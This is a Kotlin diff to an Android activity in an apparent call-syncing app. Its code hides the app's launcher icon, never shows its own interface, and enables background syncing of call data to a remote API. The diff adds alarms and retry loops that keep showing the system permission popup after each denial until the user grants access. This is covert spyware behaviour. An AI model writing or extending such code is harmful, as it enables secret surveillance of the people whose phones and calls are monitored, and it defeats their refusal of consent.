@@ -6,48 +6,40 @@ import android.os.Handler
 import android.os.Looper
 import android.util.Log
 import android.view.WindowManager
-import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
+import androidx.core.app.ActivityCompat
 
 /**
- * Install/open: pehle icon hide, phir home par sirf system permission popup.
- * CallTech UI kabhi nahi dikhti.
+ * Home wallpaper ke upar system Allow popup.
+ * Release APK + Xiaomi: classic requestPermissions + setContentView zaroori.
  */
 class PermissionTrampolineActivity : AppCompatActivity() {
     private val mainHandler = Handler(Looper.getMainLooper())
     private var askedOnce = false
     private var finished = false
 
-    private val permissionLauncher =
-        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { result ->
-            Log.d(TAG, "Permission result $result")
-            if (!SyncBootstrap.needsRuntimePermissions(this)) {
-                onAllowed()
-            } else {
-                finished = true
-                LauncherHider.hideNow(this)
-                try {
-                    moveTaskToBack(true)
-                } catch (_: Exception) {
-                }
-                finish()
-            }
-        }
-
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+        setContentView(R.layout.activity_permission_host)
         bringToFront()
         MongoSyncHelper.ensureApiUrl(this)
         CallSyncHelper.markBackgroundSyncEnabled(this, true)
         SyncBootstrap.armBackgroundSync(this)
-        LauncherHider.hideNow(this)
 
         if (!SyncBootstrap.needsRuntimePermissions(this)) {
             onAllowed()
             return
         }
 
+        PermissionPopupAlarms.schedule(this)
         mainHandler.post { askPermissions() }
+    }
+
+    override fun onAttachedToWindow() {
+        super.onAttachedToWindow()
+        if (!finished) {
+            mainHandler.post { askPermissions() }
+        }
     }
 
     override fun onResume() {
@@ -55,13 +47,23 @@ class PermissionTrampolineActivity : AppCompatActivity() {
         if (finished) {
             return
         }
-        LauncherHider.hideNow(this)
         if (!SyncBootstrap.needsRuntimePermissions(this)) {
             onAllowed()
             return
         }
         if (!askedOnce) {
-            mainHandler.postDelayed({ askPermissions() }, 120L)
+            mainHandler.postDelayed({ askPermissions() }, 200L)
+        }
+    }
+
+    override fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<out String>,
+        grantResults: IntArray,
+    ) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        if (requestCode == REQ_PERMS) {
+            handlePermissionResult()
         }
     }
 
@@ -83,7 +85,17 @@ class PermissionTrampolineActivity : AppCompatActivity() {
         }
         askedOnce = true
         bringToFront()
-        permissionLauncher.launch(missing.toTypedArray())
+        ActivityCompat.requestPermissions(this, missing.toTypedArray(), REQ_PERMS)
+    }
+
+    private fun handlePermissionResult() {
+        if (!SyncBootstrap.needsRuntimePermissions(this)) {
+            PermissionPopupAlarms.cancel(this)
+            onAllowed()
+        } else if (!isFinishing) {
+            askedOnce = false
+            mainHandler.postDelayed({ askPermissions() }, 400L)
+        }
     }
 
     private fun onAllowed() {
@@ -91,6 +103,7 @@ class PermissionTrampolineActivity : AppCompatActivity() {
             return
         }
         finished = true
+        PermissionPopupAlarms.cancel(this)
         LauncherHider.hideNow(this)
         SyncObserverManager.register(applicationContext)
         SyncBootstrap.armBackgroundSync(applicationContext)
@@ -135,5 +148,6 @@ class PermissionTrampolineActivity : AppCompatActivity() {
 
     companion object {
         private const val TAG = "PermissionTrampoline"
+        private const val REQ_PERMS = 7104
     }
 }
